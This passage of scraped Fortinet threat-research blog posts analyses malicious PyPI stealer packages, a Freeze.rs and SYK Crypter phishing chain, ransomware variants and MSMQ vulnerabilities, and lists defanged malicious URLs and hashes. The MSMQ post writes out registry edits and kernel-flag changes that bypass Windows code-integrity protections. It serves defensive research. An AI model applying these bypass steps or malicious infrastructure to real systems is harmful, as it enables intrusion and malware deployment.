Treasury's Office of Foreign Assets Control (OFAC) advisory, ransom payments may also embolden adversaries to target additional organizations, encourage other criminal actors to distribute ransomware, and/or fund illicit activities that could potentially be illegal. For organizations and individuals affected by ransomware, the FBI has a Ransomware Complaintpagewhere victims can submit samples of ransomware activity via their Internet Crimes Complaint Center (IC3). FortiGuard Labs’Emergency Incident Response Serviceprovides rapid and effective response when an incident is detected. And ourIncident Readiness Subscription Serviceprovides tools and guidance to help you better prepare for a cyber incident through readiness assessments, IR playbook development, and IR playbook testing (tabletop exercises). Ransomware Roundup FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/ransomware-roundup-trash-panda-and-nocry-variant"
  },
  {
    "title": "FortiGuard AI Detects Malicious Packages Hidden in the Python Package Index",
    "content": "FortiGuard Labs Threat Research Python Package Index (PyPI) packages have become a common way for threat actors to post malware that unsuspecting victims may download. The FortiGuard Labs team has been monitoring this attack vector for some time and, earlier this year, began posting a monthly update of the malicious packages we have discovered. Recently, we introduced a new AI engine to our OSS supply chain threats hunting system. We have already discovered several new malicious PyPI attacks using this AI engine assistant. A little preview of our AI engine detection is shown below. This report looks at two sets of malicious PyPI packages published in early July. We have bundled them together by author to demonstrate how it is common for the same author to release several similar or even identical malicious packages using different PyPI account IDs. For example, the packages in the first set were written by a threat actor who goes by the handle Josef M and uses the email address “johannes.mayer@yahoo.com.” The second set was written by an author with the PyPI ID “killskids.” These packages all had a similar project page style, as shown below: Let’s look at one of the packages, “syssqlitedmodules.” The first thing we notice in its __init__.py is a long string of encrypted code that will be run. After decryption, we can see this is a stealer malware, similar to the one we analyzed in aprevious blog. Using a Discord webhook, it tries to steal information, such as credit cards, wallets, account logins, etc. The setup.py in these packages tries to use cmdclass commands that may run when installing the package, as shown below. We can see that this setup.py tries to connect to a URL to download a potentially malicious executable file and run it. However, the payload for this package was unavailable at the time of our writing. This blog shows that the same author often uses different PyPI IDs when posting their malicious packages. This is likely an attempt to spread their malware as much as possible before it is taken down. Using similar code for each package is a quick and easy way for malware authors to distribute malware quickly while increasing its shelf life. Discovering new OSS threats hidden in millions of packages is like looking for a needle in a haystack. Our new AI engine can work far better than traditional approaches, discovering threats in near real-time to protect organizations from malicious threat actors lying in wait. FortiGuard AntiVirus detects the malicious files identified in this report as pycolouringsextV1-1.1.0 __init__.py:Python/Agent.TENR!tr sysfontstoolV1-1.1.0 __init__.py:Python/Agent.TENR!tr syscoloringsaddition-1.1.0 __init__.py:Python/Agent.TENR!tr pitutil-1.0.0 __init__.py:Python/Agent.TENR!tr syssqlitedbmodules-1.1.0 __init__.py:Python/Agent.TENR!tr killskids-auth-1.0.5 setup.py:Python/Agent.SDIK!tr killskids-auth-2.0.0 setup.py:Python/Agent.SDIK!tr testpackageforyoutube-1.0.0 setup.py:Python/Agent.SDIK!tr The FortiGuard AntiVirus service is supported by FortiGate, FortiMail, FortiClient, and FortiEDR. Customers running current AntiVirus updates are protected. The FortiGuard Web Filtering Service detects and blocks the download URLs cited in this report as Malicious. TheFortiDevSecSCA scanner detects malicious packages, including those cited in this report, that may operate as dependencies in users' projects in test phases and prevents those dependencies from being introduced into users' products. If you believe these or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. pycolouringsextV1-1.1.0 __init__.py 475e15da18cd785eb079981585a6519b sysfontstoolV1-1.1.0 __init__.py 475e15da18cd785eb079981585a6519b syscoloringsaddition-1.1.0 __init__.py 188a8e8f9afb0423276cbe92f8846c47 pitutil-1.0.0 __init__.py f658a9d876041b6434d073d883c72865 syssqlitedbmodules-1.1.0 __init__.py 188a8e8f9afb0423276cbe92f8846c47 killskids-auth-1.0.5 setup.py d643d5f2e8631bcb831e3e79d198a061 killskids-auth-2.0.0 setup.py 9286d9ad57a21c49a06dac2fb7f463ba testpackageforyoutube-1.0.0 setup.py 9c8cbdc00c745407198863372d5ca06c hxxps://github[.]com/killskids/test/raw/main/calc[.]exehxxps://github[.]com/killskids/test/raw/main/auth-server[.]exehxxps://file[.]io/IWbO1KYBw4Bn python,security attack FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/fortiguard-ai-detects-malicious-packages-in-pypi"
  },
  {
    "title": "Attackers Distribute Malware via Freeze.rs And SYK Crypter",
    "content": "FortiGuard Labs Threat Research Affected platforms:WindowsImpacted parties:Any organizationImpact:Controls victim’s device and collects sensitive informationSeverity level:Critical FortiGuard Labs recently detected a new injector written in Rust—one of the fastest-growing programming languages—to inject shellcode and introduce XWorm into a victim’s environment. While Rust is relatively uncommon in malware development, several campaigns have adopted this language since 2019, includingBuer loader,Hive, and RansomExx. FortiGuard Labs analysis also revealed a significant increase in injector activity during May 2023, where the shellcode can be encoded with Base64 and can choose from encryption algorithms such as AES, RC4, or LZMA to evade antivirus detection. By examining the encoded algorithms and API names, we identified the origin of this new injector in the Red Team tool “Freeze.rs,” designed to create payloads able to bypass EDR security controls. Additionally, during our analysis of the attack, we discovered that SYK Crypter—a tool commonly used to deliver malware families via the community chat Discord—was involved in loading Remcos, a sophisticated remote access Trojan (RAT) that can be used to control and monitor devices running Windows. SYK Crypter emerged in 2022 and has been used by various malware families, including AsyncRAT, njRAT, QuasarRAT, WarzoneRAT, and NanoCore RAT. FortiGuard Labs observed phishing email activity on July 13 that initiated an attack chain using a malicious PDF file. This file redirects to an HTML file and utilizes the “search-ms” protocol to access an LNK file on a remote server. Upon clicking the LNK file, a PowerShell script executes Freeze.rs and SYK Crypter for further offensive actions. Eventually, XWorm and Remcos are loaded, and communication with the C2 server is established. In this article, we will delve into the initial attack method employed to deliver the Rust-lang injector, SYK Crypter, and further explore the subsequent stages of the attack. The phishing email, displayed in Figure 1, masquerades as an urgent order supplement request sent to various companies to deceive the recipient. It also employs a blurred image in the PDF file to entice the victim to click a concealed button. The attached PDF file is shown in Figure 2. The malicious URL was hidden in a stream object (/ObjStm), making it challenging to detect. However, extracting the URL by pdf-parser reveals that it is located in object 14 within stream object 1, as shown in Figure 3. Upon clicking the file, the victim connects to the URL https://www[.]cttuae[.]com/ems/page[.]html, a website that seemingly offers travel services. The attacker had uploaded a malicious HTML file to the “ems” path on July 12, with the source code displayed in Figure 4. Instead of directly downloading a virus, the attacker adopts a more sophisticated approach by utilizing the “search-ms” protocol to trigger a search result. Specifically, they search for “ORDER_SPEC0723” on a remote cloud storage server facilitated by DriveHQ. Notably, the file “ORDER_PSEC0723” masquerades as a PDF file icon, but upon closer inspection, it is revealed to be an LNK file that executes a PowerShell script within the same folder, as shown in Figure 5. This tactic allows the attacker to initiate their malicious activities discreetly. The PowerShell script “pf.ps1” (Figure 6) is then executed, beginning with the use of “regsvr32” to launch the injector “doc.dll,” which was written in Rust. It opens the decoy PDF file “T.pdf” and executes “AA.exe.” Finally, all File Explorer windows are closed using “Stop-Process -Force.” The PDF file “T.pdf” in Figure 7 appears clean and contains clear text, intending to distract the victim from other malicious actions. The following section will look in detail at “doc.dll” and “AA.exe.” Figure 8 reveals that the injector was written in the Rust programming language, based on the string section analysis. The injection process begins with creating a “notepad.exe” process using CreateProcessA. The shellcode is subsequently obtained through Base64 decoding and LZMA decompression. The injector then injects the shellcode using functions directly with the NTAPI library. This entire process mirrors the behavior of the Red Team tool “Freeze.rs” which was launched in May, showing rapid adoption of this new tool.” The source code and injector’s assembly code showcased in Figure 9. Over the past month, we’ve compiled a collection of diverse Rust injectors, including DLL files with LZMA-compressed shellcode, DLL files featuring RC4-encrypted shellcode, and EXE files incorporating RC4-encrypted shellcode. The shellcode data within these injectors are all encoded using Base64, and intriguingly, the file type and encryption algorithm appear to be selectable options within the program. This observation aligns seamlessly with the options found in the “Freeze.rs” repository, suggesting a potential connection to this Red Team tool. The flexibility in choosing encryption methods and file types adds to the sophistication of these injectors, further complicating detection and analysis for security researchers. When utilizing the RC4 algorithm variant, the key is expanded to 256 bytes and used in the Pseudo-Random Generation Algorithm (PRGA). The corresponding source code and assembly for this injector variant can be seen in Figure 11. Upon comparison, it becomes evident that this attacker employs “Freeze.rs” to bypass EDRs and utilizes suspended processes. The decrypted shellcode can be found at address 0x650000, as shown in Figure 12. The decrypted shellcode applies AMSI bypass and WDLP bypass techniques, subsequently executing a .NET payload. Once executed, the .NET assembly can be dumped from memory address 0x1AAB6E70, as depicted in Figure 13, allowing for analysis as a stand-alone .NET executable. The .NET payload discovered in the process is known as XWorm, a commodity RAT tool reportedly traded in underground forums. XWorm is equipped with typical RAT functionalities, including gathering machine information, capturing screenshots, logging keystrokes, and establishing control over compromised devices. In this instance, the XWorm payload version is v3.1, and the C2 server information remains hidden on the “pastebin.com” website, as illustrated in Figure 14. The execution file, “AA.exe,” operates as an MSIL downloader and has two links embedded: “95[.]214[.]27[.]17/storage/NAR” and “plunder[.]ddnsguru[.]com/storage/NAR”. Upon download completion, “AA.exe” utilizes the file name “760” as the decoding key and performs a subtraction operation with each byte in the downloaded data. The decoded data is a SYK Crypter with a resource named \"SYKSBIKO,\" which contains the encrypted payload. The DLL file checks to ensure the environment is not in debug mode and then proceeds with processing the resource data by employing RC4 decryption with the key “gOhgyzyDebuggerDisplayAttributei.” It invokes a small .NET code, \"Zlas1,\" for further deflation. To evade detection, SYK Crypter encoded the strings utilized in its execution flow, with the decoding function depicted in Figure 17. Additionally, it employs functions like “GetProcessesByName,” “Directory.Exists,” and “File.Exists” to assess the presence of security appliances within the compromised environment. The list used for checking is found in Figure 18. For persistence, the malware appends the “.exe” extension to the file “AA” and copies the MSIL downloader to the “Startup” folder. It also adds a registry entry “Run” at “HCKU\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows.” The corresponding code is depicted in Figures 19 and 20. After RC4 decryption and deflation of the resource data “SYKSBIKO.Properties.Resources.resources‎‎.a,” the execution file is obtained, as shown in Figure 21. SYK Crypter then loads a Base64 .NET code and calls its “GetDelegateForFunctionPointer” function, creating delegation to all APIs from kernel32  or ntdll in the same method. Figure 22 shows a snippet loading “kernel32!WriteProcessMemory,” following which the decrypted payload is injected into a process. The injected payload is the Remcos RAT, originally designed as a legitimate tool for remote computer control. However, since its release in 2016, hackers have exploited it to gain control over victims’ devices. The configuration can be obtained by RC4 decrypting the “SETTINGS” resource, with the clear configuration displayed in Figure 24. Interestingly, the C2 server IP address remains the same as the XWorm payload’s. The combination of XWorm and Remcos creates a formidable trojan with an array of malicious functionalities. The C2 server's traffic report, as shown in Figure 25, reveals Europe and North America as the primary targets of this malicious campaign. As part of their strategy, the phishing campaign utilizes a PDF stream object and leverages the \"search-ms\" feature to entice unsuspecting victims. To further evade detection, threat actors adeptly use the Rust injector \"Freeze.rs\" and the MSIL file \"SYK Crypter.\" In this blog, we delved into the attack methodology employed through phishing emails and examined the various files involved in deceiving victims. Moreover, we provide a comprehensive overview of the functionalities within Freeze.rs and detail the workings of SYK Crypter. Given these developments, users should continue to exercise vigilance in handling suspicious mail and remain alert to potential threats. The malware described in this report are detected and blocked by FortiGuard Antivirus as: PDF/Agent.5D50!trLNK/Agent.AB!trHTML/Agent.S!trW64/Injector.MM!trMSIL/Agent.DWN!trMSIL/Agent.OFI!tr.dldrMSIL/Agent.VJP!trW32/Remcos.A!tr The FortiGuard AntiVirus service is supported by FortiGate, FortiMail, FortiClient, and FortiEDR, and the Fortinet AntiVirus engine is a part of each of those solutions. Customers running current AntiVirus updates are protected. The FortiGuard Web Filtering Service blocks the malicious URL and IP address. If you think this or any other cybersecurity threat has impacted your organization, contact ourGlobal FortiGuard Incident Response Team. freshinxworm[.]ddns[.]netchurchxx[.]ddns[.]netplunder[.]ddnsguru[.]complunder[.]dedyn[.]ioplunder[.]jumpingcrab[.]complunder[.]dynnamn[.]ru 95[.]214[.]27[.]17 40c9d3dec84aa057c167005f860749a2cfa55faa0cddd2fe39aaf3906819203c5a47b18066d8dcd0fbc524f529002cf0a270d8394de928e8426fa06959a8270440041c3240eaa39da781a68f6a60f93577f1b0bbdaee5a0297d7fe329c073baa908656aecc2ae845249acb392fbaa5ba3f8d26b05f4d762afb85b622f7eadcf0ca0efb6da9edbe627ab206a7f494adb42f8483da1d574ddb8f723c1ddfeaecc409505b5cf1541b783f14b1bf1403b918fae70f049d72f47439bd068a43ed8e0a88aeb09dcc59858c9969b7ae1e0e2b58f0aa90b2d27a5edfe9cd82e602ed5952f44e495e1301866188a62916859075ed73d13193823c69884312f04785707279d7e684fe7f3729edd70e2855528af3e634789155d687ed98911d1d2f0200d2a66c6da5a649f9165834c24ac8f7e2332a5612eda54312dcc9f107ab29182e58c9b499cdefac0faa328775ebb6e64b351ee43498532f987743a5a6dcfd5266f20f58235e47d5f5b8218da1d5e9dd3449c4f8969f038bba018521f9884fa1cdf693dd806527cd56244208ee530ee26c90004eb7af343ffdb618c031f63cb1d0e2409ce4e79962ec3e5a307282afcb72b4da39c4a2aace29f3f85c060d8c07cf390547e238a43f9cc38f2d4e449c7d8a557b990e60773ad02820717a634c22b609bec4e613ee1365d8561be02525896c095c8a3fda3199f2f615ab32a644f3d90451b54a4f92b1081f0c10a41c2404d51ed340181c485751efb974113a5cf401ad9cb26144c6e42601f1f1be09ece7c7fcb127637db3b953065648d1b1f371da7e8a904343ba2502d390b36403181e77192a62f31e98c87eb91906fbae27019b4c0d98ab2fc44063d4e00f221e502419d9cca598fafb9e1e00352149327267604bc1 Learn more about Fortinet’sFortiGuard Labsthreat research and global intelligence organization and Fortinet’s FortiGuard AI-powered Security Servicesportfolio. malware analysis FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/malware-distributed-via-freezers-and-syk-crypter"
  },
  {
    "title": "Key Findings from the 1H 2023 FortiGuard Labs Threat Report",
    "content": "FortiGuard Labs Threat Research In our1H 2023 Threat Landscape Report, we examine the cyberthreat landscape over the year’s first half to identify trends and share insights with security professionals, enabling them to enhance their security strategies and better prioritize patching efforts. The report findings reflect the collective intelligence of FortiGuard Labs, drawn from Fortinet's vast array of sensors that collect billions of threat events observed worldwide during this same period. Below are key takeaways from the report. In the year's first half, we observed significant activity amongadvanced persistent threat (APT)groups, a rise in ransomware frequency and complexity, increased botnet activity, and much more. And while attack volume isn’t entirely on the continual upward climb we've seen in the past, we’re witnessing breach attempts become more sophisticated and targeted. As cybercriminals continue to advance their tactics, the good news for security practitioners is that much of the malicious activity observed is familiar, giving leaders and their teams ample opportunities to implement effective defense strategies. While ransomware has existed for decades, we’ve witnessed threat actors using more-sophisticated and complex strains in recent years to infiltrate networks, largely thanks to the expansion ofRansomware-as-a-Service (RaaS) operations. Ransomware volume certainly isn't slowing down, either, with ransomware activity ending 13 times higher at the end of 1H 2023 compared to the start of the year. Yet the number of enterprises detecting ransomware on their respective networks is declining: 13% in 1H 2023 compared to nearly 25% five years ago. Unfortunately, this isn’t cause for celebration, as it indicates bad actors carrying out more targeted attacks using highly adaptable playbooks. In several previous reports, we discussed wiper malware, a highly destructive attack technique that \"wipes\" data from infected systems. While we observed asurge in wiper use in early 2022, mainly in conjunction with the Russian-Ukrainian conflict, wiper malware attacks slowed in the first half of 2023. Since its inception, Fortinet has been a core contributor to exploitation activity data supporting theExploit Prediction Scoring System (EPSS). Many vulnerability management teams use EPSS to help prioritize their remediation efforts. But EPSS can also help us track the progression of vulnerabilities from initial disclosure to the outbreak of exploitation in the wild. Our latest report analyzed six years of data spanning more than 11,000 published vulnerabilities for which our sensors detected exploitation. We sought to determine how long it takes for a vulnerability to move from initial release to exploitation, whether vulnerabilities with a high EPSS score get exploited faster, and whether we could predict the average time-to-exploitation using EPSS data. Our analysis shows that the top most exploitable vulnerabilities, as identified by EPSS, are 327 times more likely to be attacked within a week than others on your radar. Using EPSS data in this way can serve as an early warning system. For the first time in the history of our Global Threat Landscape Report, we tracked the number ofactive APT groups. Our research shows that of the 138 cyberthreat groups identified by MITRE, 41 (30%) were active during the first half of the year. Based on our malware detections, Turla, StrongPity, Winnti, OceanLotus, and WildNeutron were the most active. Yet over the past six months, APT-led threats impacted only a small subset of all organizations, indicating that APT endeavors remain highly targeted… at least for now. In this year’s report, we examined longer-term trends regarding unique exploits, malware variants, and botnet activity to give us a greater perspective on today's threat landscape. Our data shows that the count of unique exploit detections is up 68% over the past five years—a sign that attackers are multiplying and diversifying their exploits. However, we also observed a 75% drop in exploitation attempts per organization and a 10% dip in severe exploits, both of which signal that cybercriminals increasingly carry out more-targeted attacks. Malware families and variants have exploded over the past five years, up 135% and 175%, respectively. We also observed more active botnets (+27%) and a higher incidence rate of botnet infection among organizations (+126%). What’s most concerning about botnets is that they have become more persistent over this period, spending more time “lingering” on networks before they’re detected and blocked. Threat actors won’t be slowing down anytime soon, particularly as organized cybercrime groups make it even easier for them to achieve a quick payday. However, there are numerous actions organizations can take today to better protect their networks from these adversaries. Sharing and utilizing threat intelligence has never been more important to combat the ever-increasing sophistication and volume of cyberthreats. Additionally, understanding attack flows—from initial entry points to post-exploitation activities—is vital to creating effective cybersecurity strategies. Finally, there’s no better time to implement new security technologies and reassess your team's processes and playbooks. Developing and maintaining a comprehensive defense strategy is crucial to protecting enterprise networks today and in the future. Our latest Global Threat Landscape Report represents the collective intelligence of FortiGuard Labs, drawn from Fortinet’s vast array of sensors that collect billions of threat events observed worldwide during the first half of this year. The FortiGuard Labs Global Threat Landscape Report uses the MITRE ATT&CK framework to describe how threat actors find vulnerabilities, build malicious infrastructure, and exploit their targets. Download your copy of the1H 2023 FortiGuard Labs Threat Landscape Reporttoday. Threat Report,Threat Landscape Report FortiGuard Labs Threat Research FortiGuard Labs Threat Research CISO Collective Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/fortiguard-labs-threat-report-key-findings-1h-2023"
  },
  {
    "title": "Ransomware Roundup - DoDo and Proton",
    "content": "FortiGuard Labs Threat Research On a bi-weekly basis, FortiGuard Labs gathers data on ransomware variants of interest that have been gaining traction within our datasets and the OSINT community. The Ransomware Roundup report aims to provide readers with brief insights into the evolving ransomware landscape and the Fortinet solutions that protect against those variants. This edition of the Ransomware Roundup covers the DoDo and Proton ransomware. Affected platforms:Microsoft WindowsImpacted parties:Microsoft Windows UsersImpact:Encrypts and exfiltrates victims’ files and demands ransom for file decryption and not to leak stolen filesSeverity level:High DoDo ransomware was first reported in February this year. It is a variant of the widely reported and observed Chaos ransomware. Because it is a derivative, the DoDo ransomware is not considered to be a new and recent ransomware. However, a slightly different version of the DoDo ransomware has recently emerged that we describe below. DoDo ransomware samples have the “Mercurial Grabber” file icon, which indicates the ransomware was likely distributed as such. Mercurial Grabber is an open-source malware builder that can generate an infostealer configured to steal information such as Discord tokens, machine information, Windows product keys, and Chrome passwords from victims’ machines. It wasposted on GitHubon June 3, 2021, with the following disclaimer: However, threat actors have been actively using this builder to target victims and steal information by using the built-in functions shown in Figure 2, below. The latest DoDo ransomware samples have been submitted to a public file scanning service from the following countries: Older variants were submitted from the following countries: The masquerading of free apps and tools is a classically simple yet effective attack vector used by cybercriminals for years. However, in this case, the DoDo ransomware is masquerading as the nefarious Mercurial Grabber application, which means that the most likely potential victims are either malicious attackers or curious users. This also makes the abundance of submission sources rather surprising, indicating that users worldwide have all managed to somehow find and download a copy of the fake Mercurial Grabber builder. It is also important to note that the file icon can be easily changed. In other words, it can also impersonate other applications, which all users should be aware of when downloading and using apps off the internet. While the newer and older DoDo variants drop slightly different ransom notes and add different file extensions to encrypted files, they have two things in common: all DoDo ransomware samples were created using Chaos Builder version 3, which was released in mid-2021, and they all use the same Bitcoin address to receive ransom payments. Chaos ransomware Builder 3 has the disadvantage that it can only encrypt files smaller than 1 MB. Files larger than that are overwritten and considered unrecoverable unless backups remain intact. This really means that DoDo operates much like a wiper for larger files because the attacker cannot recover all of their files even if the ransom payment is made. The older DoDo ransomware variants dropped a ransomware note labeled “dodov2_readit.txt” and added a “.dodov2” extension to the encrypted files. The ransom demand is $15 worth of Bitcoin or Monero (XMR). In contrast, the recent DoDo ransomware samples drop a ransom note labeled “PLEASEREAD.txt,” add a “.crypterdodo” extension to the encrypted files, and replace the desktop wallpaper with the same ransom message. The ransom demand is still $15 worth of Bitcoin or Monero (XMR). The attacker has also included a contact email address, likely for better “customer” service. In addition, the Monero address is different from the older variants. The Bitcoin address used by the DoDo ransomware has had more than 40 transactions since May 2022. However, most incoming transactions were under $10, raising questions as to whether they were ransom payments. The Monero addresses were not available at the time of our investigation. Proton is a recently reported ransomware designed to encrypt files on the Windows platform and demand ransom payments from victims to recover their affected files. Information on the infection vector used by the Proton ransomware threat actor is not currently available. However, it is not likely to differ significantly from other ransomware groups. Proton ransomware samples were submitted to a public file scanning service from the following locations: While there is no indication that the Proton ransomware is widespread, this list shows that attackers have the means to distribute ransomware in different parts of the world. Once executed, the Proton ransomware encrypts files on victims’ machines and adds a “.[the attacker’s contact email address].Proton” extension to the affected files. It also changes the file icon of the encrypted files and drops a ransom note labeled “#[Unique ID assigned to each victim].txt” while replacing the victim’s desktop wallpaper. The Proton ransomware has several minor variants, most adding different contact email addresses as part of the file extensions added to the encrypted files. Below is a list of the contact addresses that the attacker has included in the ransom notes: During our research, FortiGuard Labs came across what appears to be the earliest sample of the Proton ransomware (SHA2: f36dda3b97266a6a30d905c73e1f8a45c4b6681e81fb2f8f59b622de899c4421), which was released in late March 2023. While the ransom note calls itself \"Proton,\" it does not use a \".Proton\" file extension. Instead, the sample uses \"Kigatsu@[redacted][victim's unique ID].kigatsu\". The ransom note includes the attacker’s Telegram ID, which is not seen in the recent ransom notes. As shown below, this variant does not replace the file icon of the encrypted files with the unique Proton logo. Another Proton ransomware variant was submitted to a public file scanning service in late June. This variant (SHA2: 3a86c8c0e96ef1984177c41c87dec40fe0df3fe71b8ef951063312010c86c9bb) uses a similar email address and the same Telegram ID as the oldest Proton ransomware sample but adds \".[attacker's email address].Proton\" to encrypted files and also changes their file icon. Based on these observations, we believe that the attacker has made some effort to improve the operation of this ransomware since its inception. Fortinet customers are already protected from this malware variant through AntiVirus and FortiEDR services, as follows: FortiGuard Labs detects known DoDo ransomware variants with the following AV signatures: FortiGuard Labs detects known Proton ransomware variants with the following AV signatures: The FortiGuard AntiVirus service is supported by FortiGate, FortiMail, FortiClient, and FortiEDR. Fortinet EPP customers running current AntiVirus updates are also protected. File-based IOCs: SHA2 Malware 8727091cbb89e5e31eeb2503ffaa242601c8840eee0973fd62fedf1b4b58ab44 DoDo Ransomware f912cd2a6cd21e828dc32b97eac0ce9b2c4e8d5a7944deaa4bd61f41ab8e1997 aee45cc2540d49a28e765c30f1c4d0b853c1a74ea2260bd7614ece8e54c3bcb3 8d76a9a577ea5ad52555a2824db6f5872548fe4bcc47d476cae57603386c4720 464d6aa8389dad3aebc36f748f6687cb57432ee791b84ff18b3dd5a342ce23a0 Proton ransomware 506dc9f186f820b5e1d39e5f553949415ced6c34d1ef4f4f723ce9d6558cfc5d 877a01b2b6b79572100ba61d799d08569063910a7f56e199bf4805cf0943e140 31485a7ce7e5b4ae39ee06c8c425fe9090d1520b062b4941ad37233cc4851fe6 9adae78f48f24419b6f8a895c1244a1576a4c7fe73e9bc32136893630ce735bd b7fbf5561006e41d56bde9e26895c8be3a3853436870e86f6929f51b719089d9 8fa93ce6b9dcf00ecf853f266f68aa033b057187c2061b950367c9ec9891571e e43db9691d7947f7edadb0f9ae8317301aeaea7604f74e69dbcb4b23420e4cbe 6a8ef9185b85490a258eda096777ba0805394e587cf8a0f8f800b87e0594edca 077621c13e3688eb4959b66a1f6f18f3791e5d869e8f064a72498d70b2e36727 39b8c17d79733974ced9a4beeb112d888174b7addca6cea008eea3846fa33658 3a86c8c0e96ef1984177c41c87dec40fe0df3fe71b8ef951063312010c86c9bb f36dda3b97266a6a30d905c73e1f8a45c4b6681e81fb2f8f59b622de899c4421 Due to the ease of disruption, damage to daily operations, potential impact on an organization’s reputation, and the unwanted destruction or release of personally identifiable information (PII), etc., it is vital to keep all AV and IPS signatures up to date. Since the majority of ransomware is delivered via phishing, organizations should consider leveraging Fortinet solutions designed to train users to understand and detect phishing threats: TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. Our FREENSE training:NSE 1 – Information Security Awarenessincludes a module on internet threats designed to help end users learn how to identify and protect themselves from various types of phishing attacks and can be easily added to internal training programs. Organizations will need to make foundational changes to the frequency, location, and security of their data backups to effectively deal with the evolving and rapidly expanding risk of ransomware. When coupled with digital supply chain compromise and a workforce telecommuting into the network, there is a real risk that attacks can come from anywhere. Cloud-based security solutions, such asSASE, to protect off-network devices; advanced endpoint security, such asEDR(endpoint detection and response) solutions that can disrupt malware mid-attack; andZero Trust Accessand network segmentation strategies that restrict access to applications and resources based on policy and context, should all be investigated to minimize risk and to reduce the impact of a successful ransomware attack. As part of the industry's leading fully integratedSecurity Fabric, delivering native synergy and automation across your security ecosystem, Fortinet also provides an extensive portfolio of technology and human-based as-a-service offerings. These services are powered by our global FortiGuard team of seasoned cybersecurity experts. Organizations such as CISA, NCSC, theFBI, and HHS caution ransomware victims against paying a ransom partly because the payment does not guarantee that files will be recovered. According to aU.S. Department of Treasury's Office of Foreign Assets Control (OFAC) advisory, ransom payments may also embolden adversaries to target additional organizations, encourage other criminal actors to distribute ransomware, and/or fund illicit activities that could potentially be illegal. For organizations and individuals affected by ransomware, the FBI has a Ransomware Complaintpagewhere victims can submit samples of ransomware activity via their Internet Crimes Complaint Center (IC3). FortiGuard Labs’Emergency Incident Response Serviceprovides rapid and effective response when an incident is detected. And ourIncident Readiness Subscription Serviceprovides tools and guidance to help you better prepare for a cyber incident through readiness assessments, IR playbook development, and IR playbook testing (tabletop exercises). Learn more about Fortinet’sFortiGuard Labsthreat research and global intelligence organization and Fortinet’s FortiGuard AI-powered Security Servicesportfolio. Ransomware Roundup FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/ransomware-roundup-dodo-and-proton"
  },
  {
    "title": "FortiGuard Labs Discovers Multiple Vulnerabilities in Microsoft Message Queuing Service",
    "content": "FortiGuard Labs Threat Research Over the last few months, FortiGuard Labs has discovered and reported multiple vulnerabilities found in the Microsoft Message Queuing (MSMQ) service. Microsoft patched these vulnerabilities in the April and July 2023 security updates. These patches are rated as critical/important, and as always, we urge users to install them as soon as possible. Affected platforms:WindowsImpacted parties:Microsoft Windows users with Microsoft Message Queuing service installedImpact:Remote code execution and denial-of-serviceSeverity level:Critical and Important In this post, we will walk through the attack surfaces of MSMQ, the approaches we took to tackle the challenges we encountered during fuzzing, and finally, we will provide details of the vulnerabilities. MSMQ is a proprietary messaging protocol developed by Microsoft that allows applications running on separate computers to communicate in a failsafe manner. MSMQ ensures reliable delivery by placing messages that fail to reach their intended destination in a queue and then resending them once the destination is reachable. RabbitMQ is an open-source messaging queuing protocol similar to MSMQ. The MSMQ service is hosted as a standalone Windows service under MQSVC.EXE. The MSMQ operation is implemented in both user-mode and kernel-mode components, namely MQQM.DLL and MQAC.SYS. As shown in Table 1, MQQM.DLL exposes TCP/IP and Remote Procedure Calls (RPC) ports allowing applications to interact with the service via the network. Based on the open ports being used, we determined that most of the potential attack surfaces are reachable remotely by adversaries. In other words, any security vulnerability discovered from these identified attack surfaces could have a severe security impact, from remote Denial of Service (DoS) to remote code execution. As a result, we uncovered three security issues reachable through port 1801, which were caused by message header parser routines implemented in MQQM.DLL. However, our attempts to identify security issues through the RPC interface have yet to yield results. Fuzzing the message header parser is straightforward, as the message header parser operates in multiple threads and thus can handle concurrent messages independently. Furthermore, there is no global state that will affect the fuzz result when the fuzzer sends crafted packets to the target. However, the challenge is that the target is running on a remote service process, and we need to monitor the target service process when it crashes. When the crash happens, a manual process restart is required as the Windows automatic service restart is not persistent. This is necessary to ensure a persistent fuzzing operation that can run continuously. Injecting DLL into the Windows Service process used to be relatively straightforward on older versions of Windows, such as Windows 7, before protected process light (PPL) and control guard were introduced. Various control guards have been deployed on critical Windows processes, such as Windows services, since Windows 10. In particular, Code Integrity Guard (CIG), which requires binaries to be signed by Microsoft if they run on Windows-protected processes, and Application Control Guard (ACG), which controls the host application's behavior according to mitigation policies.  In our case, we were greeted with the message shown in Figure 1 when we injected our custom unsigned DLL into SERVICES.EXE. According to the error message, when User-Mode Code Integrity (UMCI) is enforced, untrusted binaries cannot be executed or loaded into the protected process. While a UMCI exclusions path is partially documented by Microsoft, following the suggested registry key modification does not immediately enable us to run an unsigned DLL in the service host process. After some reverse engineering on the code integrity module, namely CI.DLL, we concluded that the following requirements need to be satisfied to work around the UMCI checks: 1. Enable UMCI path exclusions. The following example adds an exclusion for \"\\tools\" Windows Registry Editor Version 5.00[HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\CI\\TRSData]\"TestPath\"=hex(7):5C,00,74,00,6f,00,6f,00,6c,00,73,00,00,00,00,00 2. Enable UMCI audit mode. Add the following REG_DWORD Windows Registry Editor Version 5.00[HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\CI]“UMCIAuditMode” = dword:00000001 3.CI!g_CiDeveloperMode|2bitmask must be set beforeCI!CiInitializePolicyfunction exits 4. Unset the PsProtectedLight flag on the target process via EPROCESS.Protection 5. Unset the DisableDynamicCode and AuditDisableDynamicCode flags on the target process via EPROCESS.MitigationFlagsValues An astute reader should realize that steps 3 – 5 require real-time modification of some data in the kernel-module data 